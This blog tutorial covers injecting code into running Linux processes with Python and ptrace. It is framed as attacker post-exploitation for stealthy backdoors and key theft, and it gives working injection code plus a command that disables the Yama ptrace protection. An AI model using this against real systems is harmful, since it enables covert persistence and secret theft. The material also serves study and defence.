# Injecting Code in Running Processes with Python and Ptrace



> source: [https://ancat.github.io/python/2019/01/01/python-ptrace.html](https://ancat.github.io/python/2019/01/01/python-ptrace.html)





After exploiting a target or escalating privileges, there are typically a few paths we an attacker have left to take. Our goal could be lateral movement (eg gain access to some credential and reuse them elsewhere on the network), exfiltrate data (eg use our root privileges to copy database backups), or something more specific. In this post, I’ll cover injecting code into running processes which gets us all sorts of capabilities that would otherwise be much more difficult. This post and the associated code is meant as a primer to using Python and Ptrace together so I won’t be covering things like recovering complex data structures or maintaining long term persistence.

Why inject code into running processes? There are a few reasons.

1. We can maintain relatively stealthy presence: by injecting code into a long lived process (ie a daemon) we can insert a backdoor that lets us get a shell whenever we need it. This type of backdoor will not show up in a process listing, thus letting us stick around undetected.
2. We get access to that process’ memory space. For example, even with root, a passphrase protected SSL private key is useless to us. However, by inspecting the memory of a process that’s currently using that key, we can dump the passphrase-free version of the key.

A lot of this code can be found all in one place [on Github](https://github.com/ancat/gremlin).

## Introductions

### The Environment

I’m working from an x86_64 Ubuntu VM. Conceptually this should be the same on most flavors of linux, except the little assembly stubs. Similar techniques exist on OS X but I will not cover them here.

### What is ptrace?

ptrace is the linux kernel’s interface to process introspection. It gives users access to read and write another process’ state, such as memory or registers. If you’ve ever used tools like gdb or strace, you’ve also used ptrace. It’s similar to ioctl in that a single syscall can do all sorts of things, but the particular functionality is controlled by the first parameter. Check out the `requests` section in the [man page](http://man7.org/linux/man-pages/man2/ptrace.2.html) or this [ptrace tutorial](http://www.linuxjournal.com/article/6100) to see what I mean.

### Why python?

I chose Python mostly because most code injection tools and tutorials I’ve seen are written in C. I don’t like writing C - especially not when there’s a time crunch and I need to make small modifications on the fly. Also, I like really Python :~)

## Loading the Shared Object

So before we can just tell another process to load our code, there are a few steps we need to take. In short, we need to:

1. **Allocate a read/write/execute page.** This isn’t strictly necessary but it makes our lives easier since it gives us a bit of scratch space to do what we need and still have flexibility for whatever else might come up.
2. **Locate the functions to load our shared object.** In our case, we’ll need to locate `__libc_dlopen_mode` in memory and call it to load arbitrary shared objects. If you do a Google search for this function, you’ll find other code injection tutorials mixed in with a bunch of other boring linux things.
3. **Inject our stub.** A stub is a small piece of code that’s flexible enough to let us load other (typically larger) code. Stubs are easier to manipulate and debug than full payloads.
4. **Execute our stub.** We need to transfer control flow over to the stub temporarily to load our full payload. We’ll also need to transfer it back if we want to keep the original program running.

### Roadblocks

In some environments, you’ll run into some roadblocks that make using this technique more difficult or impossible. On some systems (such as Ubuntu by default) you will run into something called [Yama](https://www.kernel.org/doc/Documentation/security/Yama.txt). This prevents processes from running ptrace against any process that is not its children (that is, the only processes you can manipulate are the ones you’ve spawned). If you don’t have root, you’re largely out of luck. If you do though, you can simply turn it off:

```
echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope
```

setuid binaries will be a bit funky here as well, if you don’t have root. If a program starts off as root (ie has setuid bit set) but drops privileges to your current non-root user, you still won’t be able to ptrace attach to it. One notable example is `/usr/bin/ssh-agent`. From my man pages:

> In Debian, ssh-agent is installed with the set-group-id bit set, to prevent ptrace(2) attacks retrieving private key material. This has the side-effect of causing the run-time linker to remove certain environment variables which might have security implications for set-id programs, including LD_PRELOAD, LD_LIBRARY_PATH, and TMPDIR. If you need to set any of these environment variables, you will need to do so in the program executed by ssh-agent.

Additionally, if you’re in a container you’ll find you probably can’t use ptrace at all. Docker for example drops `CAP_SYS_PTRACE` by default, meaning even with root privileges you cannot use this technique (nor run gdb, strace, etc). Which is good because otherwise you could trivially escape the container and you wouldn’t need to read the rest of this post anyway :))))

### Setting up Python

Since we’re in Python-land, we’ll need a way to interface with the native APIs to get access to ptrace in the first place. For this, we’re going to use [ctypes](https://docs.python.org/2.7/library/ctypes.html).

```
import ctypes
import sys
import os

PTRACE_PEEKTEXT   = 1
PTRACE_PEEKDATA   = 2
PTRACE_POKETEXT   = 4
PTRACE_POKEDATA   = 5
PTRACE_CONT       = 7
PTRACE_SINGLESTEP = 9
PTRACE_GETREGS    = 12
PTRACE_SETREGS    = 13
PTRACE_ATTACH     = 16
PTRACE_DETACH     = 17

class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]

pid = int(sys.argv[1])

libc = ctypes.CDLL('/lib/x86_64-linux-gnu/libc.so.6') # Your libc location may vary!
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64
```

We already have quite a bit of boilerplate code. It’s like we’re writing in C anyway :~} At the top, we’re defining some constants and data structures we’ll need to communicate with ptrace. With the `libc = ...` bit, we’re importing libc into our code with wrappers around the functions so we can use them as if they were Python functions. In the two lines after that we set `restype` and `argtypes` so we can inform Python what ptrace arguments and return types look like. If you use ctypes for anything it’s highly advisable you set these - without them you’ll end up with strange segfaults (eg you sent a `PyObject` pointer to an integer instead of the actual integer, etc)

### Attaching to the Process

This part is kind of a big deal - everything in this post is predicated on being able to attach to the target process.

```
libc.ptrace(PTRACE_ATTACH, pid, None, None)

stat = os.waitpid(pid, 0)
if os.WIFSTOPPED(stat[1]):
    if os.WSTOPSIG(stat[1]) == 19:
        print "we attached!"
    else:
        print "stopped for some other signal??", os.WSTOPSIG(stat[1])
        sys.exit(1)
```

After we’ve set that up, we make our first actual call to ptrace. We’re telling the kernel we want to attach to the process by passing `PTRACE_ATTACH` as the first parameter (the `request`) and the process ID as the second parameter.

However, issuing the syscall isn’t enough - we need to consult [waitpid](https://linux.die.net/man/2/waitpid) to confirm we were actually able to attach properly by looking for the `SIGSTOP` signal sent to the attached process.

### Allocating the RWX Page

After attaching to the process, we need to instruct the process to call the [mmap](http://man7.org/linux/man-pages/man2/mmap.2.html) syscall. In short, we’ll use `mmap` to allocate a page of memory that is readable, writable, and executable - perfect for injecting code into. The most straightforward way to do this is to prep the registers for a call to `mmap` and then insert a `syscall` instruction at the current instruction pointer. Keep in mind this is extremely specific to your processor and environment’s calling conventions. x86_64 makes it a little easy on us by keeping the injected code to a minimum.

To reliably test this bit out, I used `nasm` and `strace` to simulate what I wanted my Python code to do.

```asm
section .text
global _start
_start:
    mov    r10, 0x22 ; flags = MAP_PRIVATE|MAP_ANONYMOUS
    mov    r8, 0     ; fd
    mov    r9, 0     ; offset
    mov    rdx, 7    ; prot = PROT_READ|PROT_WRITE|PROT_EXEC (rwx)
    mov    rsi, 10   ; length
    mov    rdi, 0    ; address
    mov    rax, 9    ; sys_mmap
    syscall          ; call mmap

    mov    rdi, rax  ; exit code
    mov    rax, 60   ; sys_exit
    syscall          ; call exit
```

By compiling this and looking at `strace` output, we can confirm it works:

```
ancat@ancat64$ nasm -felf64 test.s -o test.o && gcc test.o -nostartfiles -static -o mmap
ancat@ancat64:$ strace ./mmap
execve("./mmap", ["./mmap"], [/* 22 vars */]) = 0
mmap(NULL, 10, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0) = 0x7ffff7ffc000
_exit(140737354121216)                  = ?
+++ exited with 0 +++
```

Cool, now that we know what it takes to set up an `mmap` call, let’s translate it into Python. Luckily for us, the only code we need to inject is the `syscall` instruction; we can remove the `mov` instructions by directly placing those values into the registers using ptrace.

```
# 1
backup_registers = user_regs_struct()
registers        = user_regs_struct()

# 2
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(backup_registers))
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
backup_code = libc.ptrace(PTRACE_PEEKDATA, pid, ctypes.c_void_p(registers.rip), None)

registers.rax = 9        # sys_mmap
registers.rdi = 0        # offset
registers.rsi = 10       # size
registers.rdx = 7        # map permissions
registers.r10 = 0x22     # anonymous
registers.r8 = 0         # fd
registers.r9 = 0         # fd

# 4
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
libc.ptrace(PTRACE_POKEDATA, pid, ctypes.c_void_p(registers.rip), 0x050f)
libc.ptrace(PTRACE_SINGLESTEP, pid, None, None)

stat = os.waitpid(pid, 0)
if os.WIFSTOPPED(stat[1]):
    if os.WSTOPSIG(stat[1]) == 5:
        ""
    else:
        print "stopped for some other signal??", os.WSTOPSIG(stat[1])
        sys.exit(1)

libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
rwx_page = registers.rax
print "rwx page @", hex(rwx_page)

# 5
libc.ptrace(PTRACE_POKEDATA, pid, ctypes.c_void_p(backup_registers.rip), backup_code)
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(backup_registers))
libc.ptrace(PTRACE_CONT, pid, None, None)
```

This one’s a bit longer so I annotated it. At `#1`, we’re creating two `user_regs_structs`: one we’ll be modifying to set up our `mmap` call and another to reset our state back to before any modifications. At `#2` we call ptrace with `PTRACE_GETREGS` twice to populate the two structs. We call ptrace one more time, but with `PTRACE_PEEKDATA` to get the currently executing code, located at the instruction pointer (`registers.rip`). We’re going to need this later; we’re modifying this code, so we need a copy of it to restore from.

At `#3` we’re modifying the registers in our structure to match the assembly in the previous section. As I mentioned, this is relatively easy for us because x86_64 linux uses registers to pass arguments to a syscall. If we were on a 32 bit flavor of BSD, we would have to write these arguments to the stack instead. At ‘#4’ we’re now applying the modifications. First we’re using `PTRACE_SETREGS` to tell the process about the registers we set. We’re then using `PTRACE_POKEDATA` to insert a `syscall` instruction at the current instruction pointer. `0x050f` corresponds to the two bytes for this instruction. To execute this syscall instruction, we’re running ptrace once again, with `PTRACE_SINGLESTEP`; this instructs the kernel to execute a single instruction and hand control back to us. What this lets us do is execute that `syscall` instruction we inserted and get the return value. After our `waitpid` check we can grab the registers again and look at address `mmap` gave us.

By `#5` we’ve already called `mmap` and are ready to keep moving. Using `PTRACE_POKEDATA` we’re putting the backup code back where it was, then we use `PTRACE_SETREGS` to put the registers back as well. Once we’re done with that `PTRACE_CONT` instructs the process to continue executing as if nothing happened. Here’s what it looks like for me:

```
ancat@ancat64$ grep rwx /proc/$(pgrep test)/maps
ancat@ancat64$ python babby.py $(pgrep test)
we attached!
rwx page @ 0x7ffff7ff6000L
ancat@ancat64$ grep rwx /proc/$(pgrep test)/maps
7ffff7ff6000-7ffff7ff7000 rwxp 00000000 00:00 0
```

Using `/proc/<pid>/maps` we can look for any rwx memory pages. In our first check, there’s nothing there. Running the script shows us an address, and by checking `/proc/<pid>/maps` again we can confirm this address is indeed correct and readable/writable/executable.

### Locating Functions

Taking a step back from manipulating the process, let’s deal with functions. We have our rwx memory and know that we need to call `__libc_dlopen_mode`, but how do we get its address? There are a few ways.

1. Parse the process’ [GOT](https://en.wikipedia.org/wiki/Global_Offset_Table) and look for `__libc_dlopen_mode`: This only works if the original program makes use of this function - unlikely given this function is meant for internal use only (it doesn’t even have a man page!!!!!)
2. Find `__libc_dlopen_mode` in libc, and then locate that in memory: probably the only reasonable way out.

If you’ve ever written an exploit that bypasses ASLR you might recognize we’re pretty much doing the same thing here, but we can cheat because we have root. There might be other ways (let me know if you know any!) but the other techniques I’ve seen involved hardcoding offsets and doing pointer arithmetic all manually. No thanks!

So, breaking that down #2, we have the following steps:

1. Locate the libc shared object on disk
2. Find the offset of where libc is located in our process’ memory
3. Load that shared object into our own script so we can resolve our function’s symbol into an offset we can use

I’m going to start using `/proc/<pid>/maps` again to locate the version of libc in use. It’s unlikely to change on the same system so if already know where it’s located you can just hardcode that. I’m trying to keep things just *a little* flexible so I’ll locate it dynamically using the maps file. Here’s what it looks like on my system:

```
ancat@ancat64$ cat /proc/$(pgrep test)/maps
00400000-00401000 r-xp 00000000 fc:00 669686                             /tmp/test
00600000-00601000 r--p 00000000 fc:00 669686                             /tmp/test
00601000-00602000 rw-p 00001000 fc:00 669686                             /tmp/test
00602000-00623000 rw-p 00000000 00:00 0                                  [heap]
7ffff7810000-7ffff79cb000 r-xp 00000000 fc:00 668911                     /lib/x86_64-linux-gnu/libc-2.19.so
7ffff79cb000-7ffff7bcb000 ---p 001bb000 fc:00 668911                     /lib/x86_64-linux-gnu/libc-2.19.so
7ffff7bcb000-7ffff7bcf000 r--p 001bb000 fc:00 668911                     /lib/x86_64-linux-gnu/libc-2.19.so
7ffff7bcf000-7ffff7bd1000 rw-p 001bf000 fc:00 668911                     /lib/x86_64-linux-gnu/libc-2.19.so
7ffff7bd1000-7ffff7bd6000 rw-p 00000000 00:00 0
7ffff7dda000-7ffff7dfd000 r-xp 00000000 fc:00 668908                     /lib/x86_64-linux-gnu/ld-2.19.so
7ffff7fdb000-7ffff7fde000 rw-p 00000000 00:00 0
7ffff7ff7000-7ffff7ffa000 rw-p 00000000 00:00 0
7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]
7ffff7ffc000-7ffff7ffd000 r--p 00022000 fc:00 668908                     /lib/x86_64-linux-gnu/ld-2.19.so
7ffff7ffd000-7ffff7ffe000 rw-p 00023000 fc:00 668908                     /lib/x86_64-linux-gnu/ld-2.19.so
7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0
7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
```

Here we see libc can be found at `/lib/x86_64-linux-gnu/ld-2.19.so`. Let’s open it and find `__libc_dlopen_mode`. Since we’re sticking to Python, I’m going to use [pyelftools](https://github.com/eliben/pyelftools) to extract the function address. This one’s also a bit long so I’ve annotated it again.

```
# 1
def load_maps(pid):
    handle = open('/proc/{}/maps'.format(pid), 'r')
    output = []
    for line in handle:
        line = line.strip()
        parts = line.split()
        (addr_start, addr_end) = map(lambda x: int(x, 16), parts[0].split('-'))
        permissions = parts[1]
        offset = int(parts[2], 16)
        device_id = parts[3]
        inode = parts[4]
        map_name = parts[5] if len(parts) > 5 else ''

        mapping = {
            'addr_start':  addr_start,
            'addr_end':    addr_end,
            'size':        addr_end - addr_start,
            'permissions': permissions,
            'offset':      offset,
            'device_id':   device_id,
            'inode':       inode,
            'map_name':    map_name
        }
        output.append(mapping)

    handle.close()
    return output


maps = load_maps(pid)

# 2
process_libc = filter(
    lambda x: '/libc-' in x['map_name'] and 'r-xp' == x['permissions'],
    maps
)

if not process_libc:
    print "Couldn't locate libc shared object in this process."
    sys.exit(1)

# 3
libc_base     = process_libc[0]['addr_start']
libc_location = process_libc[0]['map_name']
libc_elf = ELFFile(open(libc_location, 'r'))

# 4
__libc_dlopen_mode = filter(
    lambda x: x.name == "__libc_dlopen_mode",
    libc_elf.get_section_by_name('.dynsym').iter_symbols()
)

if not __libc_dlopen_mode:
    print "Couldn't find __libc_dlopen_mode in libc"
    sys.exit(1)

# 5
__libc_dlopen_mode = __libc_dlopen_mode[0].entry['st_value']
print "libc base @", hex(libc_base)
print "dlopen_mode offset @", hex(__libc_dlopen_mode)
__libc_dlopen_mode = __libc_dlopen_mode + libc_base
print "function pointer @", __libc_dlopen_mode
```

`#1` is just a little utility I wrote for parsing `/proc/<pid>/maps` files. It’s a little overkill for this purpose but I already wrote it, so I’m going to use it anyway :~O Using the parsed maps file, we’re going to locate the libc used in this process and just to narrow down the search to the right page, we’re only looking at pages that are readable and executable - just code.

With the result from that, we pull two pieces of data from the map: `addr_start` because we need the base address to account for systems with ASLR enabled (basically everything); `map_name` because we need the location of the file on disk. With the path, we open it using `ELFFile`. With the open ELF file we search for the `__libc_dlopen_mode` symbol in particular. For more information on ELF data structures, check out this [tutorial](https://wiki.osdev.org/ELF_Tutorial).

Running it on my system, I get the following output:

```
ancat@ancat64$ python babby.py $(pgrep test)
libc base @ 0x7ffff7810000
dlopen_mode offset @ 0x136be0
function pointer @ 0x7ffff7946be0
ancat@ancat64$ nm -D /lib/x86_64-linux-gnu/libc-2.19.so | grep __libc_dlopen_mode
0000000000136be0 T __libc_dlopen_mode
```

Using `nm -D` to dump all the dynamic symbols in the shared object, we can confirm the address we got is the same one the system would’ve found had we called it legitimately. I’ll leave confirmation of the offset + base as an exercise to the reader :)))))) (hint: just look at it in gdb)

### Injecting and Executing the Stub

Now that we know what function to call, let’s insert the stub we need to do it. In assembly, it would look something like the following:

```
mov    rdi, ___ # first argument, pointer to .so file
mov    rsi, 1   # RTLD_LAZY
call   __libc__dlopen_mode
```

I’m going to use [process_vm_writev](http://man7.org/linux/man-pages/man2/process_vm_readv.2.html) to insert the first argument. We could use ptrace’s `PTRACE_POKEDATA` to write the path to memory but given it only lets you do 8 bytes at a time, it’s a bit tedious and is slower. `process_vm_writev` lets us do it in one call :)

```
# 1
def write_process_memory(pid, address, size, data):
    bytes_buffer = ctypes.create_string_buffer('\x00'*size)
    bytes_buffer.raw = data
    local_iovec  = iovec(ctypes.cast(ctypes.byref(bytes_buffer), ctypes.c_void_p), size)
    remote_iovec = iovec(ctypes.c_void_p(address), size)
    bytes_transferred = libc.process_vm_writev(
        pid, ctypes.byref(local_iovec), 1, ctypes.byref(remote_iovec), 1, 0
    )

    return bytes_transferred

# 2
path = "/home/ancat/bd/fancy.so"
write_process_memory(pid, rwx_page + 100, len(path)+1, path)

# 3
backup_registers = user_regs_struct()
registers        = user_regs_struct()

libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(backup_registers))
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
backup_code = libc.ptrace(PTRACE_PEEKDATA, pid, ctypes.c_void_p(registers.rip), None)

# 4
registers.rdi = rwx_page + 100 # path to .so file
registers.rsi = 1              # RTLD_LAZY
registers.rax = __libc_dlopen_mode

# 5
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
libc.ptrace(PTRACE_POKEDATA, pid, ctypes.c_void_p(registers.rip), 0xccd0ff)
libc.ptrace(PTRACE_CONT, pid, None, None)

stat = os.waitpid(pid, 0)
if os.WSTOPSIG(stat[1]) == 5:
    ""
else:
    print "stopped for some other signal??", os.WSTOPSIG(stat[1])
    sys.exit(1)

# 6
libc.ptrace(PTRACE_POKEDATA, pid, ctypes.c_void_p(backup_registers.rip), backup_code)
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(backup_registers))
libc.ptrace(PTRACE_CONT, pid, None, None)
```

I wrote a wrapper function for `write_process_memory` which you can see at `# 1`. Much like the `load_maps` helper function above, it’s overkill for this scenario but I already wrote it, so I’m going to use it :~) We then immediately use this function at `#2`. Notice we wrote this string to `rwx_page + 100`. I’m using the 100 offset since it’s unlikely that a stub we would want to inject could be this big. It’s also an easy to remember offset; we have only one string, and it’s 100 bytes away from the start of the page. By `#3` we’re doing pretty much the same prep we did earlier when we called `mmap`: we’re saving the registers and a copy of the code currently at the instruction pointer. Same thing with `#4` - we’re prepping the registers for the `__libc_dlopen_mode` call by turning our `mov` instructions from the sample stub above and putting the values directly into the registers.

In `#5`, we’re applying our changes to the registers and inserting code. You’ll see with the `PTRACE_POKEDATA` call I’m writing the constant `0xccd0ff`. What’s this you ask? It breaks down into two instructions:

```
ff d0                   call   rax
cc                      int3
```

The `call rax` is here because it’s smaller and easier to debug than `call <function pointer>` - I can just put the function pointer in `rax` and be on my way. If I used the full function pointer in this instruction I would have to make multiple `PTRACE_POKEDATA` calls (because the stub would be over 8 bytes) or use `process_vm_writev`. The stub ends with an `int3` instruction. This causes the processor to send an interrupt to our process, signaling the end of our stub’s execution. If we get the interrupt, we know our code has been properly executed. We can use this as a cue to restore execution.

The next ptrace call, with `PTRACE_CONT` tells us to execute the newly inserted code; once it’s done executing, we’ll know with the `waitpid` call immediately after it. At `#6` we’re just resetting the state by handing back control to where it was before we hijacked it.

Once the final ptrace call is finished executing, our shared object should be loaded into the process! Let’s try it out:

```
ancat@ancat64$ python babby.py 103176
libc base @ 0x7ffff7a14000
dlopen_mode offset @ 0x136be0
function pointer @ 0x7ffff7b4abe0
we attached!
rwx page @ 0x7ffff7ff7000L
======== other window
ancat@ancat64$ sh
$ echo $$
103176
$ cat 🐱  is asleep!
cat 🐱  is awake! meoooooooow

$ id
uid=1000(ancat) gid=1000(ancat) groups=1000(ancat)
```

I used `/bin/sh` as an example process to inject into. In this case you can see the output from our shared object and that the process is still usable! Goal achieved :)
